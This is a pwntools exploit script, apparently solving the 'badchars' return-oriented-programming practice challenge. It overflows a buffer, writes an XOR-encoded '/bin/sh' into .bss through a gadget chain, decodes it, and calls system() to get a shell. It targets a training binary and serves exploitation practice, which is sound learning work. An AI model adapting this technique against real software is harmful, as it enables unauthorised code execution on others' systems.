from pwn import *

p = process('./badchars')

pop_r12_r13 = 0x0000000000400b3b
pop_r14_r15 = 0x0000000000400b40
pop_rdi = 0x0000000000400b39
#pop_rdi = 0x0000000000400b3d
mov_r13_r12 = 0x0000000000400b34
xor_r15_r14b = 0x0000000000400b30
system_plt = 0x00000000004006F0
bss_addr = 0x0000000000601080
pad = 'A'*40

badchars = [98,105,99,47,32,102,110,115]
xor_byte = 1
while 1:
	binsh = ''
	for i in '/bin/sh\x00':
		a = ord(i) ^ xor_byte
		if a in badchars:
			xor_byte += 1
			break
		else:
			binsh += chr(a)
	if len(binsh)==8:
		break
		
payload = pad
payload += p64(pop_r12_r13)
payload += binsh
payload += p64(bss_addr)
payload += p64(mov_r13_r12)

for i in range(len(binsh)):
	payload += p64(pop_r14_r15)
	payload += p64(xor_byte)
	payload += p64(bss_addr+i)
	payload += p64(xor_r15_r14b)
	
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

p.sendline(payload)
p.interactive()

